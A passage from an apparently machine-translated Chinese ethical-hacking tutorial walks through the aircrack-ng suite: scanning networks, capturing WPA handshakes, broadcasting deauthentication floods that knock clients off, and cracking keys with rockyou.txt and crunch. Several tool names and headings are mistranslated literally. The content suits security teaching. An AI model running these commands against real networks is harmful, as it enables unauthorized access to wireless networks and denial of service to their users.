values:<br/>                              pcap, ivs, csv, gps, kismet, netxml, logcsv<br/>      --ignore-negative-one : Removes the message that says<br/>                              fixed channel &lt;interface&gt;: -1<br/>      --write-interval<br/>                  &lt;seconds&gt; : Output file(s) write interval in seconds<br/>      --background &lt;enable&gt; : Override background detection.<br/>      -n              &lt;int&gt; : Minimum AP packets recv'd before<br/>                              for displaying it</span><span id="a210" class="mf mg it ng b gy no nl l nm nn">Filter options:<br/>      --encrypt   &lt;suite&gt;   : Filter APs by cipher suite<br/>      --netmask &lt;netmask&gt;   : Filter APs by mask<br/>      --bssid     &lt;bssid&gt;   : Filter APs by BSSID<br/>      --essid     &lt;essid&gt;   : Filter APs by ESSID<br/>      --essid-regex &lt;regex&gt; : Filter APs by ESSID using a regular<br/>                              expression<br/>      -a                    : Filter unassociated clients</span><span id="630a" class="mf mg it ng b gy no nl l nm nn">By default, airodump-ng hops on 2.4GHz channels.<br/>  You can make it capture on other/specific channel(s) by using:<br/>      --ht20                : Set channel to HT20 (802.11n)<br/>      --ht40-               : Set channel to HT40- (802.11n)<br/>      --ht40+               : Set channel to HT40+ (802.11n)<br/>      --channel &lt;channels&gt;  : Capture on specific channels<br/>      --band &lt;abg&gt;          : Band on which airodump-ng should hop<br/>      -C    &lt;frequencies&gt;   : Uses these frequencies in MHz to hop<br/>      --cswitch  &lt;method&gt;   : Set channel switching method<br/>                    0       : FIFO (default)<br/>                    1       : Round Robin<br/>                    2       : Hop on last<br/>      -s                    : same as --cswitch</span><span id="e729" class="mf mg it ng b gy no nl l nm nn">--help                : Displays this usage screen</span></pre><p id="fa0d" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">基本用法对范围内的无线网络进行大范围扫描。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="8be2" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airodump-ng wlan0</strong></span><span id="20f4" class="mf mg it ng b gy no nl l nm nn">CH  9 ][ Elapsed: 6 s ][ 2020-10-25 18:53</span><span id="55d7" class="mf mg it ng b gy no nl l nm nn">BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span><span id="c583" class="mf mg it ng b gy no nl l nm nn">C0:3E:0F:2A:F4:8D   -1        0        0    0   1   -1                    &lt;length:  0&gt;                                                          <br/> 26:4C:E3:5C:8E:73  -22        5        0    0   1  130   WPA2 CCMP   PSK  &lt;length: 21&gt;                                                          <br/> EA:AD:A6:E0:47:A5  -58       15        0    0   6  195   OPN              REMOVED                                                               <br/> E8:AD:A6:E0:45:A4  -58       12        7    0   6  195   WPA2 CCMP   PSK  REMOVED                                                          <br/> D0:57:94:B8:AC:F6  -62        6        0    0   1  130   WPA2 CCMP   PSK  REMOVED                                                          <br/> AC:84:C6:55:95:B8  -77        2        0    0  11  270   WPA2 CCMP   PSK  REMOVED                                                           <br/> 58:EF:68:07:BE:07  -83        4        5    0   1  130   WPA2 CCMP   PSK  REMOVED                                                              <br/> AC:E2:D3:31:2A:14  -103        2        0    0   6   65   WPA2 CCMP   PSK  &lt;length: 23&gt;</span><span id="29d3" class="mf mg it ng b gy no nl l nm nn">BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><span id="4c86" class="mf mg it ng b gy no nl l nm nn">C0:3E:0F:2A:F4:8D  FC:A1:83:93:55:C9  -58    0 -24e     0        2                                                                              <br/> 58:EF:68:07:BE:07  24:4C:E3:5C:0E:73   -3    0 -24e    46        2                                                                              <br/> 58:EF:68:07:BE:07  10:AE:60:27:17:55  -20    0 - 0e     0        5                                                                              <br/> 58:EF:68:07:BE:07  68:54:FD:C4:19:B5  -43    0 -24e     0       14                                                                              <br/> 58:EF:68:07:BE:07  60:AB:14:25:EB:48  -77    0 - 1      6        3                                                                              <br/> 58:EF:68:07:BE:07  38:71:DE:F1:B6:8C  -81    0 - 1      5        2                                                                              <br/> 58:EF:68:07:BE:07  40:A2:DB:0E:DF:49  -87    0 - 1      0        1</span></pre><ul class=""><li id="ce58" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated"><strong class="kw iu"> BSSID </strong>是无线接入点(AP)的MAC地址</li><li id="a93c" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> PWR </strong>是无线单的强度，越接近0越好。</li><li id="1c56" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> CH </strong>是无线接入点(AP)使用的信道</li><li id="7d44" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> ESSID </strong>是无线网络的名称或SSID</li><li id="4481" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu">站</strong>是连接到AP的无线客户端的MAC接入</li></ul><p id="0fef" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果我们想捕获无线WEP，WPA或WPA2密钥，你可以这样做。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1167" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airodump-ng -c 6 -w SCAN --bssid E8:AD:A6:E0:45:A4 wlan0</strong></span></pre><p id="7b53" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">上面的命令是在信道6上扫描MAC地址为E8:AD:A6:E0:45:A4的接入点。从扫描开始，捕获转储将存储在文件中。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="397e" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">ls -la | grep SCAN</strong><br/>-rw-r--r--  1 root root    139345 Oct 25 19:00 SCAN-01.cap<br/>-rw-r--r--  1 root root       771 Oct 25 19:00 SCAN-01.csv<br/>-rw-r--r--  1 root root       594 Oct 25 19:00 SCAN-01.kismet.csv<br/>-rw-r--r--  1 root root      5881 Oct 25 19:00 SCAN-01.kismet.netxml<br/>-rw-r--r--  1 root root     47062 Oct 25 19:00 SCAN-01.log.csv</span></pre><p id="04a2" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">当它扫描时，文件的顶部会显示类似这样的内容…</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="a949" class="mf mg it ng b gy nk nl l nm nn">CH  6 ][ Elapsed: 6 s ][ 2020-10-25 18:59</span></pre><p id="277f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">一旦无线客户端通过身份验证，您就会看到这个。这表明你已经准备好开始破解了。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="b188" class="mf mg it ng b gy nk nl l nm nn">CH  6 ][ Elapsed: 3 mins ][ 2020-10-25 19:02 ][ <strong class="ng iu">WPA handshake: E8:AD:A6:E0:45:A4</strong></span></pre><p id="8c2a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您也可以像这样扫描特定的无线网络。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1820" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# airodump-ng --bssid E8:AD:A6:E0:45:A4 --essid <strong class="ng iu">WIRELESS_SSID</strong> wlan0</span></pre><p id="43ee" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">只需用来自“<strong class="kw iu"> airodump-ng </strong>”的实际无线网络SSID替换“<strong class="kw iu"> WIRELESS_SSID </strong>”。如果您愿意，还可以进一步将范围缩小到特定的频道。</p><h2 id="8041" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">空气播放</h2><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="b502" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng --help</strong></span><span id="c6ff" class="mf mg it ng b gy no nl l nm nn">Aireplay-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe<br/>  <a class="ae me" href="https://www.aircrack-ng.org" rel="noopener ugc nofollow" target="_blank">https://www.aircrack-ng.org</a></span><span id="f160" class="mf mg it ng b gy no nl l nm nn">usage: aireplay-ng &lt;options&gt; &lt;replay interface&gt;</span><span id="981d" class="mf mg it ng b gy no nl l nm nn">Filter options:</span><span id="39d7" class="mf mg it ng b gy no nl l nm nn">-b bssid  : MAC address, Access Point<br/>      -d dmac   : MAC address, Destination<br/>      -s smac   : MAC address, Source<br/>      -m len    : minimum packet length<br/>      -n len    : maximum packet length<br/>      -u type   : frame control, type    field<br/>      -v subt   : frame control, subtype field<br/>      -t tods   : frame control, To      DS bit<br/>      -f fromds : frame control, From    DS bit<br/>      -w iswep  : frame control, WEP     bit<br/>      -D        : disable AP detection</span><span id="f0a7" class="mf mg it ng b gy no nl l nm nn">Replay options:</span><span id="1c19" class="mf mg it ng b gy no nl l nm nn">-x nbpps  : number of packets per second<br/>      -p fctrl  : set frame control word (hex)<br/>      -a bssid  : set Access Point MAC address<br/>      -c dmac   : set Destination  MAC address<br/>      -h smac   : set Source       MAC address<br/>      -g value  : change ring buffer size (default: 8)<br/>      -F        : choose first matching packet</span><span id="fd5d" class="mf mg it ng b gy no nl l nm nn">Fakeauth attack options:</span><span id="a737" class="mf mg it ng b gy no nl l nm nn">-e essid  : set target AP SSID<br/>      -o npckts : number of packets per burst (0=auto, default: 1)<br/>      -q sec    : seconds between keep-alives<br/>      -Q        : send reassociation requests<br/>      -y prga   : keystream for shared key auth<br/>      -T n      : exit after retry fake auth request n time</span><span id="5c2b" class="mf mg it ng b gy no nl l nm nn">Arp Replay attack options:</span><span id="6e5a" class="mf mg it ng b gy no nl l nm nn">-j        : inject FromDS packets</span><span id="698a" class="mf mg it ng b gy no nl l nm nn">Fragmentation attack options:</span><span id="3b12" class="mf mg it ng b gy no nl l nm nn">-k IP     : set destination IP in fragments<br/>      -l IP     : set source IP in fragments</span><span id="48be" class="mf mg it ng b gy no nl l nm nn">Test attack options:</span><span id="6a6b" class="mf mg it ng b gy no nl l nm nn">-B        : activates the bitrate test</span><span id="2b00" class="mf mg it ng b gy no nl l nm nn">Source options:</span><span id="ee4e" class="mf mg it ng b gy no nl l nm nn">-i iface  : capture packets from this interface<br/>      -r file   : extract packets from this pcap file</span><span id="d400" class="mf mg it ng b gy no nl l nm nn">Miscellaneous options:</span><span id="0927" class="mf mg it ng b gy no nl l nm nn">-R                    : disable /dev/rtc usage<br/>      --ignore-negative-one : if the interface's channel can't be determined,<br/>                              ignore the mismatch, needed for unpatched cfg80211<br/>      --deauth-rc rc        : Deauthentication reason code [0-254] (Default: 7)</span><span id="307f" class="mf mg it ng b gy no nl l nm nn">Attack modes (numbers can still be used):</span><span id="4215" class="mf mg it ng b gy no nl l nm nn">--deauth      count : deauthenticate 1 or all stations (-0)<br/>      --fakeauth    delay : fake authentication with AP (-1)<br/>      --interactive       : interactive frame selection (-2)<br/>      --arpreplay         : standard ARP-request replay (-3)<br/>      --chopchop          : decrypt/chopchop WEP packet (-4)<br/>      --fragment          : generates valid keystream   (-5)<br/>      --caffe-latte       : query a client for new IVs  (-6)<br/>      --cfrag             : fragments against a client  (-7)<br/>      --migmode           : attacks WPA migration mode  (-8)<br/>      --test              : tests injection and quality (-9)</span><span id="5dd5" class="mf mg it ng b gy no nl l nm nn">--help              : Displays this usage screen</span></pre><p id="71a8" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">在上一节中，您会注意到您需要等待无线客户端进行身份验证，以便捕获WPA握手。对此有所帮助的方法是向无线网络上的所有客户端发送一个断开信号，并强制它们重新进行身份验证。<strong class="kw iu"> -0 </strong>参数来自上面的帮助“<strong class="kw iu">解除认证1或所有站</strong>”。它后面的数字“<strong class="kw iu"> 0 </strong>”告诉它继续运行，或者您可以指定一个特定的数字。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="3a41" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -0 0 -a E8:AD:A6:E0:45:A4 wlan0</strong><br/>17:40:25  Waiting for beacon frame (BSSID: E8:AD:A6:E0:45:A4) on channel 6<br/>NB: this attack is more effective when targeting<br/>a connected wireless client (-c &lt;client's mac&gt;).<br/>17:40:26  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]<br/>17:40:26  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]<br/>17:40:27  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]<br/>17:40:27  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]<br/>17:40:28  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]<br/>17:40:28  Sending DeAuth (code 7) to broadcast -- BSSID: [E8:AD:A6:E0:45:A4]</span></pre><p id="f7bc" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这实际上是非常严重的拒绝服务攻击，我不知道有什么方法可以阻止它。如果您连续运行该命令，它将不断断开所有无线客户端有效信号干扰整个网络。如果你知道防止这种攻击的方法，请留下你的评论，因为这将是很好的了解。</p><p id="c2e0" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果出于某种原因“<strong class="kw iu"> airplay-ng </strong>”抱怨您的无线网卡与目标不在同一个频道上，这很容易解决。例如，如果从"<strong class="kw iu"> airodump-ng </strong>"中发现的无线网络位于信道6上，那么您可以运行此命令。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="10eb" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">iwconfig wlan0 channel 6</strong></span></pre><p id="6f80" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">实际上，您可以像这样将网络中的特定无线客户端作为目标。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1d90" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -0 5 -a E8:AD:A6:E0:45:A4 -c TARGET_MAC wlan0</strong></span></pre><p id="5b66" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">使用"<strong class="kw iu"> airodump-ng </strong>"您可以查看每个网络上无线客户端的MAC地址。如果您将“<strong class="kw iu">TARGET _ MAC”</strong>替换为无线客户端受害者的MAC，它将专门针对他们。我还向您展示了如何发送5次断开连接，而不是连续运行该命令。</p><p id="9399" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">选项“<strong class="kw iu"> 9 </strong>，如“<strong class="kw iu"> -9 </strong>”也非常有用，将执行“<strong class="kw iu">测试注入和质量</strong>”。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="73bb" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -9 wlan0</strong><br/>04:44:51  Trying broadcast probe requests...<br/>04:44:51  Injection is working!<br/>04:44:53  Found 3 APs</span><span id="5c70" class="mf mg it ng b gy no nl l nm nn">04:44:53  Trying directed probe requests...<br/>04:44:53  D0:57:94:B8:AC:F6 - channel: 1 - 'REMOVED'<br/>04:44:53  Ping (min/avg/max): 1.966ms/7.358ms/29.551ms Power: -62.40<br/>04:44:53  30/30: 100%</span><span id="c7bf" class="mf mg it ng b gy no nl l nm nn">04:44:53  62:FE:3B:CE:9E:59 - channel: 1 - 'REMOVED'<br/>04:44:59  Ping (min/avg/max): 2.784ms/5.262ms/7.740ms Power: -95.00<br/>04:44:59   2/30:   6%</span><span id="8a87" class="mf mg it ng b gy no nl l nm nn">04:44:59  58:EF:68:07:BE:07 - channel: 1 - 'REMOVED'<br/>04:45:05   0/30:   0%</span></pre><p id="14ff" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你可以进行这样的攻击测试。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="8912" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -9 -i wlan1 wlan0</strong></span></pre><p id="d44e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">选项"<strong class="kw iu"> 9 </strong>"如"<strong class="kw iu"> -9 </strong>"也非常有用，将执行"<strong class="kw iu">测试注入和质量</strong>"</p><p id="0057" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">“<strong class="kw iu"> -i wlan1 </strong>”是模拟AP接收数据包的接口。</p><p id="623b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">“<strong class="kw iu"> wlan0 </strong>”是注入接口。</p><h2 id="423b" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">空气裂化</h2><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="b74f" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aircrack-ng --help</strong></span><span id="1b7f" class="mf mg it ng b gy no nl l nm nn">Aircrack-ng 1.6  - (C) 2006-2020 Thomas d'Otreppe<br/>  <a class="ae me" href="https://www.aircrack-ng.org" rel="noopener ugc nofollow" target="_blank">https://www.aircrack-ng.org</a></span><span id="2681" class="mf mg it ng b gy no nl l nm nn">usage: aircrack-ng [options] &lt;input file(s)&gt;</span><span id="5bb8" class="mf mg it ng b gy no nl l nm nn">Common options:</span><span id="8dbc" class="mf mg it ng b gy no nl l nm nn">-a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)<br/>      -e &lt;essid&gt; : target selection: network identifier<br/>      -b &lt;bssid&gt; : target selection: access point's MAC<br/>      -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)<br/>      -q         : enable quiet mode (no status output)<br/>      -C &lt;macs&gt;  : merge the given APs to a virtual one<br/>      -l &lt;file&gt;  : write key to file. Overwrites file.</span><span id="6c79" class="mf mg it ng b gy no nl l nm nn">Static WEP cracking options:</span><span id="e359" class="mf mg it ng b gy no nl l nm nn">-c         : search alpha-numeric characters only<br/>      -t         : search binary coded decimal chr only<br/>      -h         : search the numeric key for Fritz!BOX<br/>      -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)<br/>      -m &lt;maddr&gt; : MAC address to filter usable packets<br/>      -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512<br/>      -i &lt;index&gt; : WEP key index (1 to 4), default: any<br/>      -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2<br/>      -k &lt;korek&gt; : disable one attack method  (1 to 17)<br/>      -x or -x0  : disable bruteforce for last keybytes<br/>      -x1        : last keybyte bruteforcing  (default)<br/>      -x2        : enable last  2 keybytes bruteforcing<br/>      -X         : disable  bruteforce   multithreading<br/>      -y         : experimental  single bruteforce mode<br/>      -K         : use only old KoreK attacks (pre-PTW)<br/>      -s         : show the key in ASCII while cracking<br/>      -M &lt;num&gt;   : specify maximum number of IVs to use<br/>      -D         : WEP decloak, skips broken keystreams<br/>      -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW<br/>      -1         : run only 1 try to crack key with PTW<br/>      -V         : run in visual inspection mode</span><span id="c668" class="mf mg it ng b gy no nl l nm nn">WEP and WPA-PSK cracking options:</span><span id="132b" class="mf mg it ng b gy no nl l nm nn">-w &lt;words&gt; : path to wordlist(s) filename(s)<br/>      -N &lt;file&gt;  : path to new session filename<br/>      -R &lt;file&gt;  : path to existing session filename</span><span id="19fe" class="mf mg it ng b gy no nl l nm nn">WPA-PSK options:</span><span id="e114" class="mf mg it ng b gy no nl l nm nn">-E &lt;file&gt;  : create EWSA Project file v3<br/>      -I &lt;str&gt;   : PMKID string (hashcat -m 16800)<br/>      -j &lt;file&gt;  : create Hashcat v3.6+ file (HCCAPX)<br/>      -J &lt;file&gt;  : create Hashcat file (HCCAP)<br/>      -S         : WPA cracking speed test<br/>      -Z &lt;sec&gt;   : WPA cracking speed test length of<br/>                   execution.<br/>      -r &lt;DB&gt;    : path to airolib-ng database<br/>                   (Cannot be used with -w)</span><span id="1cea" class="mf mg it ng b gy no nl l nm nn">SIMD selection:</span><span id="1345" class="mf mg it ng b gy no nl l nm nn">--simd-list       : Show a list of the available<br/>                          SIMD architectures, for this<br/>                          machine.<br/>      --simd=&lt;option&gt;   : Use specific SIMD architecture.</span><span id="330b" class="mf mg it ng b gy no nl l nm nn">&lt;option&gt; may be one of the following, depending on<br/>      your platform:</span><span id="7a3c" class="mf mg it ng b gy no nl l nm nn">generic<br/>                   avx512<br/>                   avx2<br/>                   avx<br/>                   sse2<br/>                   altivec<br/>                   power8<br/>                   asimd<br/>                   neon</span><span id="e5d9" class="mf mg it ng b gy no nl l nm nn">Other options:</span><span id="5ed6" class="mf mg it ng b gy no nl l nm nn">-u         : Displays # of CPUs &amp; SIMD support<br/>      --help     : Displays this usage screen</span></pre><p id="b4ed" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">“<strong class="kw iu"> aircrack-ng </strong>”用于破解WEP、WPA和WPA2无线密钥。</p><p id="d14c" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">正如我上面提到的，我们在“<strong class="kw iu"> airodump-ng </strong>”中寻找这个结果。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="a0b0" class="mf mg it ng b gy nk nl l nm nn">As soon as a wireless client authenticates you will see this.</span><span id="db83" class="mf mg it ng b gy no nl l nm nn">CH  6 ][ Elapsed: 3 mins ][ 2020-10-25 19:02 ][ <strong class="ng iu">WPA handshake: E8:AD:A6:E0:45:A4</strong></span></pre><p id="51b9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这意味着我们成功捕获了无线客户端和接入点(AP)之间的WPA握手。</p><p id="d662" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">在本文的“<strong class="kw iu"> airodump-ng </strong>”部分，我还向您展示了如何在一个捕获文件中捕获这个WPA握手。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="701c" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">ls -la | grep SCAN</strong><br/>-rw-r--r--  1 root root    139345 Oct 25 19:00 SCAN-01.cap<br/>-rw-r--r--  1 root root       771 Oct 25 19:00 SCAN-01.csv<br/>-rw-r--r--  1 root root       594 Oct 25 19:00 SCAN-01.kismet.csv<br/>-rw-r--r--  1 root root      5881 Oct 25 19:00 SCAN-01.kismet.netxml<br/>-rw-r--r--  1 root root     47062 Oct 25 19:00 SCAN-01.log.csv</span></pre><p id="f329" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你主要有两种方法破解无线密码。要么通过字典攻击，要么通过暴力。我推荐阅读我的另一篇文章，“<a class="ae me" rel="noopener ugc nofollow" target="_blank" href="/ethical-hacking-part-4-password-hash-cracking-11ae7ab17fb0">道德黑客(第4部分):密码&amp;哈希破解</a>”，在那里我详细介绍了这些技术。</p><p id="27ee" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">一个"<strong class="kw iu">字典攻击</strong>"不仅仅使用字典中的单词。它将使用任何常用的密码或密码组合。也许是一些常见的键盘序列或一些常见的东西，如“密码1！”会被瞬间破解。有一个非常大的单词列表叫做“<a class="ae me" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> rockyou.txt </strong> </a>”，目前包含<strong class="kw iu"> 14344391 </strong>密码。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="f8bc" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt-get install wget -y</strong></span><span id="0076" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">wget </strong><a class="ae me" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" rel="noopener ugc nofollow" target="_blank"><strong class="ng iu">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</strong></a></span><span id="06a0" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">wc -l rockyou.txt </strong><br/>14344391 rockyou.txt</span></pre><p id="7cb1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你可以像这样把这个单词表和"<strong class="kw iu"> aircrack-ng </strong>"一起使用。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="3933" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aircrack-ng -w rockyou.txt SCAN_test-01.cap -e ESSID</strong></span></pre><ul class=""><li id="4360" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated"><strong class="kw iu"> rockyou.txt </strong>是我们下载的词表</li><li id="9858" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> SCAN_test-01.cap </strong>是由<strong class="kw iu"> airodump-ng </strong>创建的捕获文件</li><li id="9d85" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">- <strong class="kw iu"> e ESSID </strong>是目标无线网络的无线名称/ SSID</li></ul><p id="1515" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">当它运行时，它看起来像这样…</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="595e" class="mf mg it ng b gy nk nl l nm nn">Aircrack-ng 1.6</span><span id="c727" class="mf mg it ng b gy no nl l nm nn">[00:00:10] 50654/14344391 keys tested (5021.50 k/s)</span><span id="8c98" class="mf mg it ng b gy no nl l nm nn">Time left: 47 minutes, 26 seconds                          0.35%</span><span id="f67c" class="mf mg it ng b gy no nl l nm nn">Current passphrase: lucky!</span><span id="34b1" class="mf mg it ng b gy no nl l nm nn">Master Key     : 56 BE BE F6 9B 3B CE 8B D8 A1 A2 23 C1 CB 3D C4 <br/>                 30 DA A8 DB 75 40 3C B2 43 CA 58 55 6D 2E 8B 01</span><span id="cc8c" class="mf mg it ng b gy no nl l nm nn">Transient Key  : D6 48 80 29 CB 04 46 AA 1E F1 22 5F 61 37 17 0A <br/>                 94 96 C0 12 F1 F0 BD 3C 12 5D 15 B4 DD 65 4F DB <br/>                 07 65 91 F7 DE 3E 9F 01 37 D5 ED 96 E4 B5 74 49 <br/>                 7A 68 46 27 CE 6F C9 F1 86 23 42 91 E2 2C CF 5E</span><span id="f87a" class="mf mg it ng b gy no nl l nm nn">EAPOL HMAC     : C3 51 8D 09 F2 2D 7E C4 70 5B 3C C9 DD B7 78 FB</span></pre><p id="52e8" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">每秒5021个键对于一个虚拟机来说并不算太差:)但是我给了我的Kali实例两个CPU和8GB内存。</p><p id="1fd1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">第二种方法是暴力攻击。现在，这将尝试每个字符的每种组合，这在使用强密码的今天是一个有点不可能的任务。但是，如果您可以通过提供密码的大小或密码的大小范围来缩小搜索范围，就可以做到这一点。如果您知道密码中的任何字符(可能在特定位置)，可以进一步缩小范围。如果有任何可以排除的字符或字符集，可以进一步缩小范围。例如，如果你知道一个密码将是8个字符长，是字母数字，将很快被破解。</p><p id="a130" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你要用的工具叫做“嘎吱嘎吱”。这个工具功能非常丰富，不可能在这里一一描述。最好是打开它的手册(<strong class="kw iu"> man crunch </strong>))，向下滚动到最后的例子。</p><p id="ddbc" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">基本用法如下。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="3e90" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">crunch -F aircrack-ng -w - SCAN_test-01.cap -e ESSID</strong></span></pre><h2 id="0bcc" class="mf mg it bd mh mi mj dn mk ml mm dp mn ld mo mp mq lh mr ms mt ll mu mv mw mx bi translated">空军基地</h2><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1ab9" class="mf mg 